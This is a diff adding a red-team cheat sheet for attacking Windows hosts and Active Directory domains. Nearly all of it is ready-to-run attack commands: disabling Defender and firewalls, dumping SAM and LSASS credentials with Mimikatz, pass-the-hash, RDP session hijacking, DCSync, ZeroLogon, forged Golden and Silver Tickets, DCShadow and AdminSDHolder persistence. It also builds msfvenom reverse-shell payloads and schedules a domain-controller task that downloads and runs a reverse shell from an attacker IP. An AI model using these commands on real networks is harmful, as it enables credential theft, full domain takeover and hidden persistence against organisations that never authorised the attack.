@@ -1,0 +1,864 @@
+1. User Enumeration
+
+Get current username
+echo %USERNAME% || whoami
+$env:username
+
+List user privilege
+whoami /priv
+whoami /groups
+
+List all users
+net user
+whoami /all
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+
+List logon requirements; useable for bruteforcing
+net accounts
+
+Get details about a user (i.e. administrator, admin, current user)
+net user administrator
+net user admin
+net user %USERNAME%
+
+List all local groups
+net localgroup
+Get-LocalGroup | ft Name
+Get details about a group (i.e. administrators)
+net localgroup administrators
+
+
+
+2. Network Enumeration
+
+List all network interfaces, IP, and DNS.
+ipconfig /all
+Get-NetIPConfiguration 
+Get-DnsClientServerAddress -AddressFamily IPv4
+
+List current routing table
+route print
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+
+List the ARP table
+arp -A
+Get-NetNeighbor -AddressFamily IPv4 
+
+List all current connections
+netstat -ano
+
+List firewall state and current configuration
+netsh advfirewall firewall dump
+or 
+netsh firewall show state
+netsh firewall show config
+
+List firewall's blocked ports
+$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
+
+Disable firewall
+netsh firewall set opmode disable
+netsh advfirewall set allprofiles state off
+
+List all network shares
+net share
+
+SNMP Configuration
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+
+
+3. Antivirus & Detections
+
+Windows Defender
+Get-MpComputerStatus
+
+# disable Real Time Monitoring (Need Administrator Rights)
+Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+Set-MpPreference -DisableIOAVProtection $true
+
+AppLocker Enumeration
+HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
+AppLocker rules
+$applocker = Get-ApplockerPolicy -effective
+$applocker.rulecollections
+
+
+Default Writeable Folders
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
+
+4. Password Hunting
+SAM and SYSTEM files
+The Security Account Manager (SAM) is kind of a database file, that stores the user passwords in a hashed format in the actual registries, either as a LM hash or as a NTLM hash. 
+File location -  %SystemRoot%/system32/config/SAM and is mounted at HKLM/SAM
+
+# Usually %SYSTEMROOT% = C:\Windows
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+Generate a hash file for John using pwdump or samdump2.
+pwdump SYSTEM SAM > /root/sam.txt
+samdump2 SYSTEM SAM -o sam.txt
+
+Then crack it with john -format=NT /root/sam.txt.
+
+Search for file contents
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*
+
+Search for a file with a certain filename
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ user.txt
+where /R C:\ *.ini
+
+Search the registry for key names and passwords
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+Read a value of a certain sub key
+REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
+
+Unattend files - 
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+Contents displaying screen:
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul.
+
+Unattend credentials are stored in base64 and can be decoded manually with base64.
+$ echo "base64coded"  | base64 -d 
+
+IIS Web config
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+
+Other files
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+
+5. Tools for Privilege Escalation:
+JAWS
+PowerUP
+Sherlock or Watson
+Windows-Exploit-Suggester
+Beroot
+Seatbelt
+winPEAS
+https://github.com/deep1792/Windows-Privilege-Escalation/blob/main/Cheat-Sheet%20for%20Red-Team-Assessments  -- My Complete Windows Privilege Escalation Tutorial
+
+6. Windows Version and Configuration
+systeminfo
+
+Extract patchs and updates
+wmic qfe
+
+Architecture
+wmic os get osarchitecture
+
+List all env variables
+set
+Get-ChildItem Env: 
+
+List all drives
+wmic logicaldisk get caption 
+fsutil fsinfo drives
+wmic logicaldisk get caption,description,providername
+Get-PSDrive 
+
+======================================================================
+Domain Enumeration -- 
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView   -- download Powerview
+
+Now this will AV detectable, so it's very easy to bypass the AV, just change the methodologies, and u will get the results...!!! --- Just Google this---!!!!!!
+
+1. User Enumeration
+
+#Get a list of users in the current domain
+Get-DomainUser
+
+#Find User Accounts used as Service Accounts
+Get-DomainUser -SPN
+
+#Get list of all properties for users in the current domain
+Get-DomainUser –Properties pwdlastset
+Get-DomainUser -Properties samaccountname,description
+Get-DomainUser –Properties lastlogon
+Get-DomainUser –Properties description
+Get-DomainUser –Properties badpwdcount
+
+# all enabled users, returning distinguishednames
+Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
+
+# all disabled users
+Get-DomainUser -UACFilter ACCOUNTDISABLE
+
+2. Groups Enumeration
+#Get all the groups in the current domain
+Get-DomainGroup
+Get-DomainGroupMember -Name "Domain Admins"
+
+Get-DomainGroup –Domain <targetdomain>
+Get-DomainGroupMember -Name "Domain Admins"
+
+#Get all the members of the Domain Admins group
+Get-NetGroupMember -GroupName "Domain Admins"
+Get-NetGroupMember  -GroupName "Domain Admins" -Recurse
+Get-DomainOU
+Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <DOmain name here>
+
+#Get the group membership for a user:
+Get-DomainGroup –UserName "hacker"
+
+3. Computers enumeration
+Get-DomainComputer
+Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
+Get-DomainComputer –OperatingSystem "*Server 2012*"
+Get-DomainComputer  -Ping
+Get-DomainComputer -Name "computer-name"
+
+4. GPOs - Group Policy Objects
+In simple terms a GPO is a virtual collection of policy settings which has unique name, such as a GUID.
+
+Get-DomainGPO
+Get-DomainGPO | Select displayname
+Get-DomainGPO -ComputerName <computer-name>
+
+#Get machines where the given user is member of a specific group
+Get-DomainGPOUserLocalGroupMapping -UserName hacker -Verbose
+
+#Domain
+Get-domain
+# enumerate all gobal catalogs in the forest
+Get-ForestGlobalCatalog
+
+#Get OUs in a domain
+Get-DomainOU
+
+#Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
+Get-DomainGPO 
+Get-DomainGPO -Name "{AB306569-220D-43FF-B03B83E8F4EF8081}"
+
+5. File Shares in the domain  ------ most important as 70-80% chances u will get a lot of stored information specially by marketing and sales teams
+#Find shares on hosts in current domain.
+Find-DomainShare –Verbose
+
+#Get all fileservers of the domain
+Get-DomainFileServer -Verbose
+
+#Find Non Standard Shares
+Find-DomainShare –Verbose -ExcludeStandard -ExcludeIPC -ExcludePrint
+
+#Find sensitive files on computers in the domain
+Invoke-FileFinder –Verbose
+
+6. ACLs -- Access Controls lists -- simple terms what rights u have on the domain
+#Get the ACLs associated with the specified object
+Get-ObjectAcl -SamAccountName hacker –ResolveGUIDs
+
+
+#GenericWrite for all users > under advanced > Write all properties
+Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
+
+#Add user to domain admin
+net user hacker /domain; Add-DomainGroupMember -Identity 'Domain Admins' -Members 'hacker' -Domain "hacked"; net user hacker /domain
+
+
+7. User Domain Hunting:
+
+#Find all machines on the current domain where the current user has local admin access
+Test-AdminAccess –Verbose
+
+#Tools
+https://raw.githubusercontent.com/admin0987654321/admin1/master/Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess.ps1 
+https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1
+FindPSRemotingLocalAdminAccess.ps1
+
+#Find local admins on all machines of the domain 
+#(needs administrator privs on non-dc machines).
+Find-DomainLocalGroupMember –Verbose
+
+#Find computers where a domain admin (or specified user/group) has sessions:
+Find-DomainUserLocation
+Find-DomainUserLocation -GroupName "RDPUsers"
+
+#To confirm admin access
+Find-DomainUserLocation -CheckAccess
+
+#Find computers where a domain admin is logged-in.
+Find-DomainUserLocation -Stealth
+
+
+==========================================================================================================
+Lateral Movement
+
+1. Breaking SAM passwords
+reg save HKLM\sam sam
+reg save HKLM\system system
+
+samdump2 SYSTEM SAM
+
+nano samhashes.txt
+
+#Crack the passwords
+hashcat -m 1000 -a 3 hashes.txt password.txt
+
+2. SAM cracking with Mimikatz
+
+Download Mimikatz:
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1
+
+import-module .\Invoke-Mimikatz
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+3. Pass the Hash Attack
+
+A Pass-the-Hash (PtH) attack is a very common method, where an attacker captures the password NTLM hash and then simply passes it to different computer to login. Attackers commonly obtain hashes by scraping a system’s memory and other techniques such as SMBrelay.
+
+Import-Module .\Invoke-Mimikatz 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:hacker /domain: /ntlm: /run:powershell.exe"'
+
+Import-Module .\Powerview.ps1
+Get-DomainComputer
+
+#see if we have access to a server
+Invoke-Command -ComputerName ad -ScriptBlock{whoami; whoami /groups; hostname}
+Invoke-Command -ComputerName web -ScriptBlock{whoami; whoami /groups; hostname}
+
+#creating a session and hosting on a variable
+$sess = New-PSsession -ComputerName hacker1 
+
+#Disable AV and Firewall
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
+
+#Entering Created Session
+Enter-PSsession $sess
+
+Rubeus provides the similar attacks like mimikatz, but is a bit complicated, like the formatting of the hash, sometimes to convert multiple formats to get the correct format, sometimes spacings, so i prefer to use mimikatz.
+
+4. Session hijacking
+
+Elevate permission to SYSTEM
+PsExec.exe -s \\localhost cmd
+whoami
+
+#Get Conneted user
+query user
+
+#Create service which will hijack user's session:
+sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
+
+#start the service
+net start sesshijack
+
+5. SMB Relay using the Responder 
+
+===============================================================================================
+Domain Privilege Escalation
+
+1. ACLs 
+
+DNSAdmin
+
+Get-DomainGroup -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericAll')}
+
+Get-DomainGroup -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+Get-DomainGroup -SamAccountName "DNSAdmins" | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Add user to domain admins
+
+Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'hacker1'
+
+Get-DomainGroupMember -SamAccountName 'DnsAdmins'
+
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=hacked,DC=local")}
+
+Get-ObjectAcl -SamAccountName "DNSAdmins" -ResolveGUIDs
+
+First of, let's get its distinguishedName
+
+Get-DomainGroup -SamAccountName "DNSAdmins"
+
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=hacked,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll')}
+
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=hacked,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Add user to domain admins
+
+Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'hacker1'
+
+Get-DomainGroupMember -SamAccountName 'DnsAdmins'
+
+
+2. Privilege Escalation Domain Admins
+
+#Find the members in the DNSAdmin
+Import-Module powerview.psm1
+Get-DomainGroup -SamAccountName "DNSAdmin"
+Get-DomainGroupMember -Name "DNSAdmin"
+
+#In this method, we load an arbitrary DLL with SYSTEM privileges on the DNS server. 
+Remote dll injector will be the best case for this, but roght now we r having an access to the remote DC system, hence we will do it directly
+
+#Building the DLL using msfvenom:
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f dll > dnsadmins.dll
+
+#Injecting the DLL in dns.exe
+#C:\Windows\system32\dnscmd.exe
+
+dnscmd <FQDN of DC> /config /serverlevelplugindll \\UNC_path
+
+dnscmd machine.hacked.local /config /serverlevelplugindll \\192.168.1.1\dnsadmins.dll
+
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+#Start Listening
+nc.exe -nlvp 4444 
+
+#For restarting the server
+sc.exe <FQDN of DC> stop dns
+sc.exe <FQDN of DC> start dns
+
+3.  DCSync
+DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, or more precisely to create a Golden Ticket, as DCSync can be used to compromise the krbtgt account’s password.
+
+To perform a DCSync attack, the attacker must have the Replicating Directory Changes All and Replicating Directory Changes privileges. 
+
+Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. It is also possible for any user to be granted these specific privileges. Once obtained, an adversary uses the Directory Replication Service (DRS) Remote Protocol to replicate data (including credentials) from Active Directory.
+
+The KRBTGT is a local default account that acts as a service account for the Key Distribution Center (KDC) service. It's created automatically when a new domain is created. It cannot be deleted. its name cannot be changed. it cannot be enabled.
+
+KDC service handles all Kerberos ticket requests so KRBTGT account in AD plays a key role that encrypts and sign all Kerberos tickets for the domain.
+
+Get-ForestGlobalCatalog
+
+Get-DomainUser -Name hacker1
+
+#Get the object ACL for the hacked.local forest
+Get-ObjectACL "DC=hacked,DC=local" -ResolveGUIDs 
+
+#Get the object ACL matching ObjectAceType = DS-Replication for the hacked.local forest
+Get-ObjectACL "DC=hacked,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*')
+
+#Get the object ACL matching ObjectAceType = DS-Replication and SecurityIdentifier for my current user =  for the hacked.local forest
+Get-ObjectACL "DC=hacked,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*') -and ($_.SecurityIdentifier -match 'SID') }
+
+#Get the all the ACL in the hacked.local forest for my current SecurityIdentifier
+Get-ObjectACL "DC=hacked,DC=local" -ResolveGUIDs | ? { ($_.SecurityIdentifier -match 'SID') }
+
+#dump the commands for administrator
+invoke-mimikatz -Command '"lsadump::dcsync /user:hacked\administrator"'
+
+#pass the hash to become the administrator
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain: /ntlm: /run:powershell.exe"'
+
+#see if we are administrator
+invoke-command -ComputerName dc.hacked.local -ScriptBlock{whoami;hostname}
+
+#enter powershell session for the dc as the administrator
+Enter-PSSession -ComputerName dc.hacked.local
+hostname
+whoami
+
+
+3. ZeroLogon attack
+Zerologon -- CVE-2020-1472, is an authentication bypass vulnerability in the Netlogon Remote Protocol (MS-NRPC), a remote procedure call (RPC) interface that Windows uses to authenticate users and computers on domain-based networks. It was designed for specific tasks such as maintaining relationships between members of domains and the domain controller (DC), or between multiple domain controllers across one or multiple domains and replicating the domain controller database.
+
+#See if it is vulnerable
+lsadump::zerologon /target:dc.hacked.local /account:dc$
+
+#Exploit it
+lsadump::zerologon /target:dc.hacked.local /account:dc$ /exploit
+
+#dcsync
+lsadump::dcsync /dc:dc.hacked.local /authuser:dc$ /authdomain:exploit.local /authpassword:"" /authntlm /user:krbtgt 
+
+#Pass the hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:hacker1 /domain: /ntlm: /run:powershell.exe"'
+
+4. Delegations:
+https://www.youtube.com/watch?v=UGWP4ewxcTA  ---  best explation to understand the delegations
+
+#Enumerate
+Get-DomainComputer -TrustedToAuth
+
+#msds-allowedtodelegateto
+
+. .\Invoke-Mimikatz.ps1
+invoke-mimikatz
+
+#ask dc for a tgt for the hacker server
+#Download kekeo:
+https://github.com/gentilkiwi/kekeo/releases
+kekeo.exe
+tgt::ask /user:hacker$ /domain:hacked.local /rc4:rc4hashoftheAdmin
+
+#ask dc for a tgs for the hacker server
+tgs::s4u /tgt:ticket-dumped.kirbi /user:Administrator@hacked.local /service:time/ad.hacked.local|ldap/ad.hacked.local
+
+#use the tgs and inject it
+..\ invoke-mimikatz.ps1
+Invoke-Mimikatz -Command '"kerberos::ptt ticket-dumped"'
+
+#Dcsync to perform a goldent ticket attack
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:hacked\krbtgt"'
+
+5. Generic Write ACL exploitation --
+WriteProperty on an ObjectType allow us to modify/overwrite the Script-Path, which means that the next time, when the user logs on, their system will execute our malicious script:
+
+#Enumerate to find all objects with GenericWrite
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}
+
+#Enumerate to find all objects with GenericWrite and for my current username
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Enumerate to find ippsec with GenericWrite and for my current username
+Get-ObjectAcl -SamAccountName "ippsec" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'SID')}
+
+#Building the EXE using msfvenom:
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > malicious.exe
+
+#create a shared folder and add it there and allow everyone to access it
+Get-DomainUser -Identity testuser -Properties scriptpath
+
+$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force 
+
+$Cred = New-Object System.Management.Automation.PSCredential('<system-name>\dfm.a', $SecPassword) 
+
+Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\<share-drive-path>\program2.exe'}  -Credential $Cred -Verbose 
+
+Get-DomainUser -Identity testuser -Properties scriptpath
+
+6. Kerberosting
+The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
+
+#see if the account you disabled appears
+Get-DomainUser -PreauthNotRequired -Verbose
+
+#Requesting hash
+.\Rubeus.exe asreproast /format:hashcat /outfile:AESREP.asreproast
+
+hashcat -m 18200 --force -a 0 AESREP.asreproast passwords.txt 
+
+---------------
+Exploiting by SET
+
+Get-DomainUser -PreauthNotRequired -Verbose
+
+#If you do not find anything, you can look if you can set the PreauthNotRequired with ACL GenericAll or GenericWrite
+. .\powerview.ps1
+
+#Get your SID
+whoami
+Get-DomainUser -SamAccountName hacker1
+
+#GenericAll
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'SID')}
+
+#GenericWrite
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'SID')}
+
+#Disable the DoesnotRequirePreAuth:
+Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=ID value} –Verbose
+
+#Export Hashes
+.\Rubeus.exe asreproast /format:hashcat /outfile:hacker-hash.asreproast
+
+
+#crack offline
+hashcat -m 18200 --force -a 0 hacker-hash.asreproast passwords.txt 
+
+
+#Set it back to normal
+Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=512} –Verbose
+
+===================================================================================================
+Domain Persistence:
+
+1. DSRM
+DSRM is Directory Services Restore Mode, which is the highest branch user means AD Administrator whose password changing means a lot of things, like AD restarting, and this is not possible in real-time environment,.
+
+#Create Session
+$sess = New-PSSession -ComputerName dc
+
+#Disable Firewall and AV
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
+Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1
+
+#Enter Session
+Enter-PSSession $sess
+
+#Enter New KeyReg
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+#If KeyReg Exist:
+
+#Get-ItemProperty to see if DsrmAdminLogonBehavior is set to 2
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+#If DsrmAdminLogonBehavior is not set to 2
+Set-ItemProperty -Name "DsrmAdminLogonBehavior" -Value 2
+
+#Get-ItemProperty to see if DsrmAdminLogonBehavior is set to 2
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+
+#Compare the Administrator hash with the Administrator hash of below command
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
+
+#Dump DSRM password (needs DA privs) to be used for the command below
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
+
+#Use below command to pass the hash. Use the hash from the above command
+
+#Needs to be excute from another powershell windows with local admin
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<hash> /run:powershell.exe"'
+
+#Session
+$sess = New-PSSession -ComputerName dc
+Enter-PSSession $sess
+ls \\dc\c$
+
+2. DC Shadow
+Means to add ur own attributes or creates a complete shadow of the running DC
+
+#run as system
+PsExec.exe -i -s cmd 
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:hacker5 /attribute:badpwdcount /value:blahblah
+lsadump::dcshadow /object:hacker5 /attribute:PwdLastset /value:<hex>
+
+#open cmd as admin
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
+
+-----------------------------
+Changing the SID
+
+Enterprise Admins is a group in the forest root domain that has full AD rights to every domain in the AD forest. It is granted this right through membership in the Administrators group in every domain in the forest.
+
+. .\Powerview.ps1
+Get-DomainGroup -SamAccountName "Enterprise Admins"
+
+#run as system
+PsExec.exe -i -s cmd 
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:hacker1 /attribute:SIDHistory /value:SID
+
+#open cmd as admin
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
+
+-------------------------------
+Changing the hash
+
+#run as system
+PsExec.exe -i -s cmd 
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:jenkinsadmin /attribute:unicodePwd /value:00000000000000000000000000000000
+
+
+#open cmd as admin
+#see the hash
+lsdump:dcsync /user:username
+
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
+
+#see the changed hash
+lsdump:dcsync /user:username
+
+---------------Pass the hash attack------------
+sekurlsa::pth /user:username /domain: /ntlm:00000000000000000000000000000000 /run:powershell.exe
+
+3. Golden Ticket  - simply a ticket to the entire domain, this is achieved as follows:
+Attacker gains an access to KDC --> Dumps KRBTGT hash, and generates a valid TGS for the resources in the domain.
+
+. .\Powerview.ps1
+Get-DomainUser -SamAccountName Administrator
+
+#Do Over the PAss hash with an user with access to the DC
+#Execute mimikatz on DC as DA to get krbtgt hash
+$sess = New-PSSession -ComputerName dc-hacked.local
+
+#Disable Firewall and AV
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
+Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1
+
+#Enter Session
+Enter-PSsession $sess
+
+#Get all the hash and the important krbtgt
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+#Get krbtgt silently
+The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dc-hacked\krbtgt"'
+
+#On any machine
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:hacked.local /sid:SIDvalue /krbtgt:<krbtgt-hash> id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+klist
+ls \\dc\c$
+cd \\dc\c$
+
+
+4. Silver Ticket --
+An attacker can forge the TGS requests to login to the specific services. 
+
+. .\powerview
+Get-DomainSID
+S-1-5-21-*-*-*
+
+#run dcsync to get administrator's HASH
+. .\invoke-mimikatz
+invoke-mimikatz -Command '"lsadump::dcsync /user:hacked\administrator"'
+
+#Create Silver ticker for HOST
+Invoke-Mimikatz -Command '"kerberos::golden /domain:hacked.local /sid:S-1-5-21-*-*-* /target:dc.hacked.local /service:HOST /rc4:<rc4-hash> /user:Administrator /ptt"'
+
+#List the current ticket
+klist
+
+#See if you have access
+schtasks /s dc.hacked.local 
+
+#edit Invoke-PowerShellTcp.ps1 or Invoke-PowerShellTcpOneLine.ps1
+#Download it from here: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+
+#add the following at the end of the file
+Invoke-PowerShellTcp -Reverse -IPAddress <localIP> -Port 443
+
+#Host the edited Invoke-PowerShellTcp.ps1 with HFS:
+https://www.rejetto.com/hfs/?f=dl
+
+#listen with Powercat
+nc -nlvp 4444
+
+#Schedule a task
+schtasks /create /S dc.hacked.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.1.1/Invoke-PowerShellTcpOneLine.ps1''')'"
+
+#Run The task
+schtasks /Run /S dc.hacked.local  /TN "STCheck"
+
+#Extra
+#Using hash of the Domain Controller computer account, below
+#command provides access to shares on the DC.
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:hacked.local /sid:S-1-5-21-*-*-* /target:hacked.local /service:CIFS /rc4:<rc4-hash> /user:Administrator /ptt"'
+
+
+5. AdminSDHolder -- a template for the security descriptors (objects) for the protected accoutns and groups.
+
+#First get DA
+Import-Module powerview.ps1
+
+Adding Permission - 
+#Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights All -Verbose
+
+#Other interesting permissions (ResetPassword, WriteMembers)
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights ResetPassword -Verbose
+
+Invoking SDpropagator ---
+https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory
+
+#Create session to DC and load Invoke-SDPropagator.ps1 in the session
+$sess = New-PSSession -ComputerName dc.hacked.local -credential hacker
+Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
+Enter-PSSession -Session $sess
+
+#Invoke Invoke-SDPropagator.ps1 from the session
+Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1 -Verbose
+
+Check ACLs --- 
+#Check the Domain Admins Permission to see if our user is there now.
+#PowerView as normal user:
+Get-DomainObjectAcl -SamAccountName "domain admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-*-*-*')}
+Get-DomainObjectAcl -SamAccountName "Domain Controllers" | ? {($_.SecurityIdentifier -match 'S-1-5-21-*-*-*')}
